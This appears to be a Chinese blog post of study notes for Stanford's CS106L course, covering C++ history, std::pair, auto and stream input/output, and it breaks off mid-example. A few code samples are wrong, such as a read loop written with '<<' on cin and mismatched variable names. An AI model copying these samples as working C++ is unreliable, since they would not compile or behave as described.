            "content_html": "<h1 id=\"课程资料\"><a class=\"markdownIt-Anchor\" href=\"#课程资料\">#</a> 课程资料</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUs4NDExYjdBVS8/c3BtX2lkX2Zyb209MzMzLjMzNy5zZWFyY2gtY2FyZC5hbGwuY2xpY2smYW1wO3ZkX3NvdXJjZT04NWFjZjBhNTlkZWQwMmU0Yzc1YWUxMTU4YmFjYTIwNw==\">Video</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2FyY2hpdmUvY3MvY3MxMDZsL2NzMTA2bC4xMjI0Lw==\">Slides/Code</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9mdWxsX2NvdXJzZV9yZWFkZXIucGRm\">Course Reader</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9hc3NpZ25tZW50LXNldHVw\">Assignment</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29yZ3MvY291cnNld29ya3MvcmVwb3NpdG9yaWVzP3E9QVAxNDAxLTImYW1wO3R5cGU9YWxsJmFtcDtsYW5ndWFnZT0mYW1wO3NvcnQ9\">AP1401-2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2FyY2hpdmUvY3MvY3MxMDZsL2NzMTA2bC4xMjEyLw==\">Spring 2021 资料</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9sZWN0dXJlcy8=\">综合资料</span></li>\n</ul>\n<h1 id=\"学习流程\"><a class=\"markdownIt-Anchor\" href=\"#学习流程\">#</a> 学习流程</h1>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">17</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token number\">1.</span> 阅读 Course Reader对应章节</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token number\">2.</span> 观看video</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token number\">3.</span> 阅读Slides</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token number\">4.</span> 整理Code</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>以上流程完成后：</p>\n<ol>\n<li>完成 CS106L 所有 Assignment</li>\n<li>完成 AP1401-2 所有作业</li>\n</ol>\n<h1 id=\"welcome\"><a class=\"markdownIt-Anchor\" href=\"#welcome\">#</a> Welcome</h1>\n<p>本节课主要讲述了 C++ 的应用前景，历史发展和设计哲学。</p>\n<h2 id=\"c应用前景\"><a class=\"markdownIt-Anchor\" href=\"#c应用前景\">#</a> C++ 应用前景</h2>\n<p><img data-src=\"future.png\" alt=\"C++应用前景\"></p>\n<h2 id=\"c的历史\"><a class=\"markdownIt-Anchor\" href=\"#c的历史\">#</a> C++ 的历史</h2>\n<h3 id=\"汇编语言\"><a class=\"markdownIt-Anchor\" href=\"#汇编语言\">#</a> 汇编语言</h3>\n<p>在早期阶段，尚没有高级语言这一说。程序员大多使用汇编语言编写程序，汇编语言的好处在于：</p>\n<ul>\n<li>使用较为简单的指令进行编程</li>\n<li>汇编语言执行速度较快</li>\n<li>程序员可以直接操作计算机底层寄存器等</li>\n</ul>\n<p>但是，汇编语言编程也有它的缺陷，缺陷就在于：</p>\n<ul>\n<li>程序涉及到对计算机底层硬件的基础操作，而不只是处理逻辑，因此对其他程序员来说，阅读起来较为困难</li>\n<li>因为汇编语言涉及到指令集架构，而指令集架构和计算机底层硬件和操作系统紧密相关，因此在一台机器上运行的程序可能无法迁移到另一台程序，简单来说就是可移植性较差</li>\n<li>汇编语言编写的程序因为使用的是一些基本的操作，因此程序较长</li>\n</ul>\n<p>因此， <code>Ken Thompson</code>  和 <code>Dennis Ritchie</code>  于 1972 年发明了 C 语言。</p>\n<h3 id=\"c-语言\"><a class=\"markdownIt-Anchor\" href=\"#c-语言\">#</a> C 语言</h3>\n<p>C 语言是一门高级语言，相较汇编，它的优势在于：</p>\n<ul>\n<li>面向过程编程，较为简单。程序员在编写程序时，无需考虑计算机底层架构，而只需要考虑处理逻辑，因此编程较为简单</li>\n<li>C 语言可以由编译器编译为汇编指令，在不同的机器上，可以编译出不同的汇编指令，而后汇编器又可以将汇编指令转化为针对该计算机指令集架构的机器指令，实现 C 语言的可迁移性</li>\n<li>C 语言程序执行速度非常快</li>\n</ul>\n<p>然而，在面对更复杂的编程问题时，C 语言也表现出了它的不足：</p>\n<ul>\n<li>C 语言是面向过程的语言，它无法面向对象。当我们需要更复杂的结构和它的一系列方法时，C 语言只为我们提供了一些有限的结构，无法满足我们对高级结构的需求</li>\n<li>C 语言无法对不同类型提供一个泛化的模板，对于不同类型的传入参数，我们可能需要重复写多个几乎一致的处理函数</li>\n<li>写大型项目时，很多时候很难将一个问题拆解为一个面向过程的模型，不是所有问题都可以使用模块化的过程方法解决</li>\n<li>写出来的程序较长</li>\n</ul>\n<h3 id=\"c\"><a class=\"markdownIt-Anchor\" href=\"#c\">#</a> C++</h3>\n<p>针对 C 语言的问题， <code>Bjarne Stroustrup</code>  于 1983 年开发了 C++ 语言，他希望能够在 C 语言基础上实现一个具有多种不同特性的高级语言。 C++ 语言一开始只是 <code>C with classes</code> ，实现了 C 语言面向对象的延伸。而后逐步发展，直到今天的 <code>C++23</code> 。</p>\n<p><img data-src=\"evolution.png\" alt=\"C++的演化\"></p>\n<h2 id=\"c的几大特性\"><a class=\"markdownIt-Anchor\" href=\"#c的几大特性\">#</a> C++ 的几大特性</h2>\n<ul>\n<li>通用语言<br>\n有的语言可以在应用到多个场景中，但是在解决特定场景问题时会显得复杂，比如 C++ 在做矩阵乘除法时，需要程序员手动编写程序，效率较低。但是 C++ 的用途很广。而有的语言，可以解决特定问题，但是并不泛用。比如 Matlab 在做科学计算时非常的常用，但是在解决其他问题时并没有 C++ 高效。</li>\n<li>编译型语言<br>\n高级语言需要转换成机器可以阅读的二进制码才能被计算机执行。而高级语言分为编译型和解释型。其区别在于，解释型语言使用解释器 (Interpreters) 进行翻译，一边翻译一边执行。解释器在执行一条语句的同时，获取下一条语句。而编译型语言使用编译器进行编译。将整个源代码编译完成后，直接执行生成的二进制码。</li>\n<li>静态类型语言<br>\n静态类型语言是指语句中的每个变量在声明后都有固定的类型，一旦确定，不能随意更改。而动态类型（如 Python、Javascript）会在执行的过程中动态的判断变量的类型。静态类型语言会在编译阶段检查语句是否合法，否则产生编译错误。而动态类型通常无法在编译阶段确定该语句是否有编译错误，错误均在程序运行时产生，也称为运行时错误。编译阶段排错让运行时错误出现的概率大大降低。这样无需运行即可排除程序错误。</li>\n<li>多范式语言<br>\n部分语言只有单一范式，如 C 语言，无法编写面向对象程序。而 C++ 可以同时实现面向对象特性，泛型特性，和面向过程的特性。非常灵活。</li>\n<li>中间语言<br>\n部分底层语言（如汇编）直接和计算机内存打交道，但是利用其写出的程序逻辑不清晰，难以理解。而部分语言无法直接对计算机底层进行操纵（如 Python、Java) 等，程序员在编写程序时就像是被禁锢，无法探索底层的奥秘。C++ 可以像 C 语言那样接触底层硬件（利用指针），也可以利用其面向对象特性构造大型程序，同时实现封装和抽象。触及底层系统和实现抽象的目的同时达到，非常便于程序员大展身手。</li>\n</ul>\n<h2 id=\"c的设计哲学\"><a class=\"markdownIt-Anchor\" href=\"#c的设计哲学\">#</a> C++ 的设计哲学</h2>\n<ul>\n<li>只有在需要解决特定问题时引入新的特性</li>\n<li>程序员可以自由选择编程风格</li>\n<li>隐藏实现细节，抽象出编程接口</li>\n<li>让程序员能够完全以自己想要的方式编写程序</li>\n<li>让编写的程序尽可能高效</li>\n<li>编译时进行类型检查</li>\n<li>可以兼容早期版本程序，也兼容 C 语言程序</li>\n</ul>\n<h2 id=\"c的应用\"><a class=\"markdownIt-Anchor\" href=\"#c的应用\">#</a> C++ 的应用</h2>\n<ul>\n<li>浏览器</li>\n<li>JVM</li>\n<li>火星探索车</li>\n<li>等等</li>\n</ul>\n<h1 id=\"type-and-structs\"><a class=\"markdownIt-Anchor\" href=\"#type-and-structs\">#</a> Type and Structs</h1>\n<p>关于类型和结构体没什么好说的，主要的用法和 C 语言中差不多。但是 <code>string</code>  类在使用之前需要在程序最开始处 <code>#include&lt;string&gt;</code> ，并且最好是不要使用 <code>using namespace std</code> ，而是使用 <code>std::string</code> ，对于 <code>std::cout</code>  和 <code>std::cin</code>  也是一样。这样做是为了保证程序员在自主开发时，不和 <code>std</code>  域内的的东西重名导致出错。</p>\n<h2 id=\"stdpair\"><a class=\"markdownIt-Anchor\" href=\"#stdpair\">#</a>  <code>std::pair</code></h2>\n<p>一种 <code>STL</code>  内置结构，其中包括两个域。 <code>std::pair</code>  相当于是个模板，其中域的类型随意。声明时使用如下格式：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span>string<span class=\"token operator\">></span> p <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"st\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>此外，还可以在程序中使用如下方法构建 <code>std::pair</code> ：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span>string<span class=\"token operator\">></span> p <span class=\"token operator\">=</span> std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"st\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在使用 <code>pair</code>  时，分别用 <code>p.first</code>  和 <code>p.second</code>  来引用两个域。</p>\n<h2 id=\"auto类型推导\"><a class=\"markdownIt-Anchor\" href=\"#auto类型推导\">#</a>  <code>auto</code>  类型推导</h2>\n<p>使用 <code>auto</code>  变量表示允许编译器自行推导值的类型。</p>\n<div class=\"note info\">\n<p>什么时候使用 <code>auto</code> ？</p>\n<ul>\n<li>使用迭代器时，我不关心值的类型</li>\n<li>使用模板时，值的类型已经可以根据上下文推断出来</li>\n<li>使用 <code>lambda</code>  时，咱不知道值是啥类型</li>\n<li>没那个必要时，尽量不要将 <code>auto</code>  作为返回值类型</li>\n</ul>\n</div>\n<h1 id=\"streams\"><a class=\"markdownIt-Anchor\" href=\"#streams\">#</a> Streams</h1>\n<blockquote>\n<p>How can we convert between string-represented data and the real thing? Streams!</p>\n</blockquote>\n<p>本节首先介绍了什么是环境，而后引入 <code>Stream</code>  的概念，讲解了 <code>Streams</code>  在读入和写出数据时的一些特点。而 <code>Streams</code>  可以利用 <code>cin</code>  和 <code>cout</code>  这两种 <code>iostream</code>  类的对象，实现从标准输入和控制台进行读取。也可以通过 <code>ifstream</code>  和 <code>ofstream</code>  两种来实现文件的读取和写入。亦可以通过 <code>istringstrean</code>  和 <code>ostringstream</code>  来实现字符串和其他类型之间的连接。但是普通的 <code>cin</code>  和 <code>cout</code>  在使用时也可能出现读取的问题，因此我们还可以使用 <code>std::getline()</code>  来进行一行一次的读取。此外，在使用 <code>Stream</code>  时，还应该注意判别读取异常和写入异常。</p>\n<h2 id=\"streams-overview\"><a class=\"markdownIt-Anchor\" href=\"#streams-overview\">#</a> Streams Overview</h2>\n<h3 id=\"environment\"><a class=\"markdownIt-Anchor\" href=\"#environment\">#</a> Environment</h3>\n<p>在学习 Stream 之前，我们先要了解 <code>Environment</code> （环境）的概念。我们家里有温度计，我们通常通过温度计上的水银球去检测环境温度，然后将摄氏度显示在数轴上，人们通过观测数轴上的数字来查看当前温度。在这个例子中，外界就是环境，水银球就是将温度转化为实际示数的媒介，而数轴就是温度的输出，将温度显示出来供人们了解。而在程序编写的过程中，也可能存在一个外部环境，程序需要从这个环境获取信息，然后在利用一些处理逻辑来进行一些计算，最后返回输出或者将输出打印在屏幕上。这个环境可能是用户输入，也可能是外部文件，还有可能是其他程序。</p>\n<h3 id=\"stream-是什么\"><a class=\"markdownIt-Anchor\" href=\"#stream-是什么\">#</a> Stream 是什么</h3>\n<blockquote>\n<p>Streams is an abstraction for input and output. Streams convert between data and the string representation of data.</p>\n</blockquote>\n<p>Stream 是程序与外部环境交流的媒介。Stream 的输入与输出可能来自用户，也可能来自程序，也可能来自其他文件。如果要将一个变量输出到终端，那么变量就会以字符串的形式打入 Stream，然后 Stream 将其输出到终端。如果要从用户输入读取数据，那么也是将用户输入转化为字符串存储在 Stream 中，然后再将其转储到变量中。</p>\n<h3 id=\"stream-特点\"><a class=\"markdownIt-Anchor\" href=\"#stream-特点\">#</a> Stream 特点</h3>\n<ul>\n<li>可以对大体积数据进行分片读取，然后存储</li>\n<li>可以读取多个类型的数据</li>\n<li>可以串联多个 <code>&lt;&lt;</code>  读取</li>\n</ul>\n<h2 id=\"cin-与-cout来自键盘去往终端\"><a class=\"markdownIt-Anchor\" href=\"#cin-与-cout来自键盘去往终端\">#</a> cin 与 cout：来自键盘，去往终端</h2>\n<p><code>cout</code>  为 Stream 对象，它从变量中获取数据，存储到一个 Buffer 中，然后将其<strong>输出到终端上</strong>。<br>\n <code>cin</code>  也是 Stream 对象，它从<strong>用户输入</strong>获取值，存储到一个 Buffer 中，然后将其转储到对应类型的变量中。<br>\n在使用这两个输入流前，需要在程序开始处 <code>#include &lt;iostream&gt;</code></p>\n<h2 id=\"ifstream-与-ofstream来自文件去往文件\"><a class=\"markdownIt-Anchor\" href=\"#ifstream-与-ofstream来自文件去往文件\">#</a> ifstream 与 ofstream：来自文件，去往文件</h2>\n<div class=\"note info\">\n<p>问题思考：</p>\n<ol>\n<li><code>ifstream</code>  和 <code>ofstream</code>  分别是什么？</li>\n<li>还有什么特殊的读写文件类？特殊在哪？</li>\n<li><code>i/ofstream</code>  和 <code>cin/cout</code>  在使用上有什么不一样之处？</li>\n<li>使用 <code>ifstream</code>  和 <code>ofstream</code>  需要包含什么头文件？</li>\n<li><code>ifstream</code>  怎么初始化？初始化后需要做哪些检查？</li>\n<li><code>ofstream</code>  怎么初始化？初始化后需要做哪些检查？</li>\n<li>如果传入的文件名是 <code>string</code>  类型，如何处理？</li>\n<li><code>close()</code>  时有哪些需要注意的地方？</li>\n</ol>\n</div>\n<h3 id=\"ifstream-ofstream-overview\"><a class=\"markdownIt-Anchor\" href=\"#ifstream-ofstream-overview\">#</a> ifstream &amp; ofstream Overview</h3>\n<p><code>ifstream</code>  和 <code>ofstream</code>  分别从文件读取和写入文件。此外，还有一个叫做 <code>fstream</code>  的类型，即可以完成写入，又可以完成读取）。此外， <code>ifstream</code>  和 <code>ofstream</code>  在使用上与 <code>cin/cout</code>  不一样之处在于， <code>ifstream</code>  和 <code>ofstream</code>  是一个类型，而不是一个对象，但是 <code>cin</code>  及 <code>cout</code>  分别是 <code>std::istream</code>  和 <code>std::ostream</code>  类的对象。在使用对象的方法时 ( <code>&lt;&lt;</code>  和 <code>&gt;&gt;</code>  已被重载) 可以直接调用，但是在使用一个类的方法时，首先需要初始化这个类的一个对象，然后再对其方法进行调用。</p>\n<h3 id=\"ifstream-ofstream-使用说明\"><a class=\"markdownIt-Anchor\" href=\"#ifstream-ofstream-使用说明\">#</a> ifstream &amp; ofstream 使用说明</h3>\n<h4 id=\"包含头文件\"><a class=\"markdownIt-Anchor\" href=\"#包含头文件\">#</a> 包含头文件</h4>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fstream></span></span></pre></td></tr></table></figure><h4 id=\"ifstream-初始化-使用\"><a class=\"markdownIt-Anchor\" href=\"#ifstream-初始化-使用\">#</a> ifstream 初始化 &amp; 使用</h4>\n<p>可以直接使用构造函数，在参数列表中填入文件名进行初始化：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ifstream <span class=\"token function\">myStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>也可以在使用默认构造函数初始化后，利用类的 <code>open()</code>  方法打开文件：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ifstream myStream<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>myStream<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>使用 <code>ifstream</code>  对象的方法与使用 <code>cin</code>  相似，如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>myStream <span class=\"token operator\">>></span> myInteger</pre></td></tr></table></figure><p>注意，在 <code>open()</code>  方法调用后，推荐使用 <code>myStream.is_open()</code>  来探测是否真的成功打开了文件。</p>\n<h4 id=\"ofstream-初始化-使用\"><a class=\"markdownIt-Anchor\" href=\"#ofstream-初始化-使用\">#</a> ofstream 初始化 &amp; 使用</h4>\n<p><code>ofstream</code>  初始化过程及使用过程与前文 <code>ifstream</code>  相似。若文件不存在，调用 <code>open()</code>  方法会新创建一个文件，否则会覆盖原有的同名文件。（所以尽量做好备份）</p>\n<h4 id=\"关闭流close\"><a class=\"markdownIt-Anchor\" href=\"#关闭流close\">#</a> 关闭流： <code>close()</code></h4>\n<ol>\n<li>当流的生命周期结束时，C++ 会为你自动关闭流</li>\n<li>你也可以手动使用 <code>close()</code>  方法关闭流</li>\n</ol>\n<h4 id=\"使用-string-作为文件名时\"><a class=\"markdownIt-Anchor\" href=\"#使用-string-作为文件名时\">#</a> 使用 string 作为文件名时…</h4>\n<p>注意， <code>string</code>  类的开发时间要晚于 <code>ifstream</code>  和 <code>ofstream</code> ，彼时 <code>ifstream</code>  和 <code>ofstream</code>  只接受 C 语言的字符串类型。因此，要将一个 <code>string</code>  类型的文件名传入这两个类的对象，我们必须调用 <code>.c_str()</code>  来将其转化为 C 语言格式的字符串。</p>\n<h2 id=\"stream-manipulators\"><a class=\"markdownIt-Anchor\" href=\"#stream-manipulators\">#</a> Stream manipulators</h2>\n<p><code>stream manipulator</code>  可以让对变量及输出的处理更加方便，程序员无需手动编程实现一些较为繁琐的功能。几种常用的 <code>stream manipulator</code>  如下：</p>\n<ol>\n<li><code>endl</code> : 输出后换行</li>\n<li><code>setw</code> : 设置输出的宽度</li>\n<li><code>left/right</code> : 通常与 <code>setw</code>  连用，表示左补空格 / 右补空格</li>\n<li><code>setfill</code> : 在宽度一定，文字没有填满处补充特定的占位符</li>\n<li><code>boolalpha</code> : 用 <code>true/false</code>  表示 <code>1/0</code></li>\n<li><code>hex</code> : 将输入输出理解为 16 进制</li>\n<li><code>dec</code> : 输入输出为 10 进制</li>\n<li><code>oct</code> : 输入输出为 8 进制</li>\n<li><code>ws</code> : 跳过所有的空格</li>\n</ol>\n<h2 id=\"stream-异常处理\"><a class=\"markdownIt-Anchor\" href=\"#stream-异常处理\">#</a> Stream 异常处理</h2>\n<p>在使用 <code>stream</code>  进行读取时，可能会出现读取异常的情况，比如读进来的值是个字符串，但是程序想把它保存到一个 <code>int</code>  类中，这样就产生了类型异常。我们需要在读取后使用 <code>cout.fail()</code>  或 <code>cin.fail()</code>  来判断读取是否成功，如果有异常，我们需要手动处理异常，然后用 <code>cin.clear()</code>  表达异常已经处理完毕。</p>\n<div class=\"note info\">\n<p>注意，在使用 <code>while</code>  循环进行读取时，尽量把异常判断放在 <code>while</code>  循环内，如果判断到异常则退出，否则就进行下一次读取。不要把 <code>while</code>  循环放在条件判断中，否则可能会导致读取异常后依然在进行输出，因此尽量使用如下的结构。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>cin<span class=\"token punctuation\">.</span><span class=\"token function\">fail</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为 <code>stream</code>  在读取到最后或读取错误时会返回 <code>false</code> ，而其他情况下会返回 <code>stream</code>  对象本身（也可以判断为 <code>true</code> ），因此我们可以使用 <code>cin &lt;&lt; intValue &lt;&lt; doubleValue</code>  之类的语句作为判断的条件，以简化上述的循环，结构如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>cin <span class=\"token operator\">&lt;&lt;</span> intValue <span class=\"token operator\">&lt;&lt;</span> doubleVALUE<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></div>\n<h2 id=\"stream-的麻烦之处\"><a class=\"markdownIt-Anchor\" href=\"#stream-的麻烦之处\">#</a> Stream 的麻烦之处</h2>\n<p>Stream 存在一个问题，如果用户多次连续读取值，而其中某一次读入的值的类型不匹配的话，则会连环影响到后面的读取。这其中的根本原因是， <code>stream</code>  本身是一个附带了一个读写头的 <code>buffer</code>  字符数组，而每次读取后，读写后都会向后移动，下一次读取的位置是上一次读取的位置 + 上一次读取的长度。比如说我们需要读取一个 <code>int</code> ，再读取一个 <code>string</code> 。上一次用户输入了 <code>8.265</code> , 那么第一次就只会读入 <code>8</code> ，下一次读取从 <code>.265</code>  开始，导致 <code>string</code>  读取出错。</p>\n<p>此外， <code>cin</code>  的特点是： <code>cin</code>  越过一切前导空格和换行符，在读入有效字符后，遇到空格或换行符就停止读取，见如下程序：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tstring name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tstring city<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tcin <span class=\"token operator\">>></span> name <span class=\"token operator\">>></span> city<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"My name is \"</span> <span class=\"token operator\">&lt;&lt;</span> name <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"The city is \"</span> <span class=\"token operator\">&lt;&lt;</span> city <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果输入的第一个 <code>name</code>  是 <code>First Last</code> ， <code>city</code>  输入的是 <code>Wuhan</code> 。由于 <code>cin</code>  遇到空格就停止读取，那么 <code>name</code>  中存储的值就是 <code>First</code> ， <code>city</code>  中存储的值就是 <code>Last</code> ，而 <code>Wuhan</code>  依然在 <code>buffer</code>  中无法读取。</p>\n<p>因此，要解决标准的 <code>stream</code>  带来的麻烦，我们引入一个新的函数： <code>getline()</code></p>\n<h2 id=\"用getline函数读取标准输入\"><a class=\"markdownIt-Anchor\" href=\"#用getline函数读取标准输入\">#</a> 用 <code>getline()</code>  函数读取标准输入</h2>\n<p><code>getline()</code>  可以将输入保存在 <code>string</code>  中。 <code>getline</code>  函数的用途在于，如同他的名字，它可以一次读取一行，而 <code>cin</code>  每次读到空格或换行符就停止。 <code>getline</code>  不会忽略空格，会将其一并读入，但是 <code>getline</code>  遇到换行符就停止读取，并且换行符依然留存在 <code>stream buffer</code>  中。因此 <code>getline</code>  非常适合那种用户需要在这个字符串中保留空格的情况。</p>\n<p>前文我们说过， <code>cin</code>  会在开始读取时越过一切前导的空格和换行符，读取有效字符后，遇到空格和换行符就停止读取，并且将其留在 <code>stream buffer</code>  中，以待下一次的读取。那么如果我们将 <code>cin</code>  和 <code>getline</code>  混用时，便会出现一些问题。</p>\n<p>参考如下示例：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> dummyInt<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>string dummyString<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cin <span class=\"token operator\">>></span> dummyInt<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">getline</span><span class=\"token punctuation\">(</span>cin<span class=\"token punctuation\">,</span>dummyString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>cin</code>  首先读入了一个数，然后<strong>将换行符留在了 <code>buffer</code>  中</strong>，但是下一次调用 <code>getline</code>  时， <code>getline</code>  遇到换行符就停止读取。导致读入的 <code>dummyString</code>  并不是我们下一次输入的字符串，而是一个空串。这都是因为上一个字符串的换行符还没有处理干净。<br>\n最好的解决办法是将这种原始的输入输出读取，改为调用封装好的功能完善的库函数。</p>\n<h2 id=\"用getline函数读取文件\"><a class=\"markdownIt-Anchor\" href=\"#用getline函数读取文件\">#</a> 用 <code>getline()</code>  函数读取文件</h2>\n<p>参考之前 <code>cin</code>  循环从文件读取的形式，我们可以编写一个使用 <code>getline</code>  循环读取文件的格式:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ifstream <span class=\"token function\">capitals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"capitals.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>string capital<span class=\"token punctuation\">,</span>country<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token comment\">// check if the file is correctly opened</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">getline</span><span 